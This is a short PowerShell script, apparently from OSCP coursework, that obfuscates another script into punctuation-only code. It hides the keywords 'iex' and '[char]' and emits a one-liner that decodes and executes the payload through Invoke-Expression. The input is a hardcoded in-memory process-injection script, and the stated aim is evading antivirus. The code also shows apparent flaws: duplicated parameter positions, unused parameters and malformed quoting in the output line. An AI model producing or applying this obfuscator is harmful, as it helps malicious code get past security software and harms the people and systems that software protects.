param(
  [parameter(mandatory = $true,
    HelpMessage = 'Enter input file name.',
    Position = 0
    )][string]$FileName,
  [parameter(mandatory = $true,
    HelpMessage = 'Enter script directly.',
    Position = 0
    )][string]$Script
)

${)}=${~}=+$() #0
${!}=++${~}    #1
${@}=++${~}    #2
${#}=++${~}    #3
${$}=++${~}    #4
${%}=++${~}    #5
${^}=++${~}    #6
${&}=++${~}    #7
${*}=++${~}    #8
${(}=++${~}    #9

${;}="".("$(@{})"["${!}${$}"]+"$(@{})"["${!}${^}"]+"$(@{})"["${!}${&}"]+"$(@{})"[${$}]+"$?"[${!}]+"$(@{})"[${#}])

${-}="["+"$(@{})"[${&}]+"$(@{})"["${!}${(}"]+"$(@{})"["${@}${)}"]+"$?"[${!}]+"]" #[char]
${=}="${;}"[${#}]+"${;}"["${!}${)}"]+"${;}"["${@}${&}"] #iex

$prep = '${)}=${~}=+$();${!}=++${~};${@}=++${~};${#}=++${~};${$}=++${~};${%}=++${~};${^}=++${~};${&}=++${~};${*}=++${~};${(}=++${~};${;}="".("$(@{})"["${!}${$}"]+"$(@{})"["${!}${^}"]+"$(@{})"["${!}${&}"]+"$(@{})"[${$}]+"$?"[${!}]+"$(@{})"[${#}]);${-}="["+"$(@{})"[${&}]+"$(@{})"["${!}${(}"]+"$(@{})"["${@}${)}"]+"$?"[${!}]+"]";${=}="${;}"[${#}]+"${;}"["${!}${)}"]+"${;}"["${@}${&}"];'

function Get-EncodedCode
{
    param([string]$code)
    ([char[]]$code|
    %{
        '${-}'+ ([int]$_  -replace "0",'${)}' -replace "1",'${!}' -replace "2",'${@}' -replace "3",'${#}' -replace "4",'${$}' -replace "5",'${%}' -replace "6",'${^}' -replace "7",'${&}' -replace "8",'${*}' -replace "9",'${(}')
    })  -join '+'
}

  
  $script = get-content "/home/rikoteki/Desktop/OSCP/14.3.2._Evading_AV_with_Thread_Injection/in-memory-injection.ps1"
  $cmd = Get-EncodedCode $script
  Write-Host "$prep;"`"($cmd)'|${=}"|&${=}'

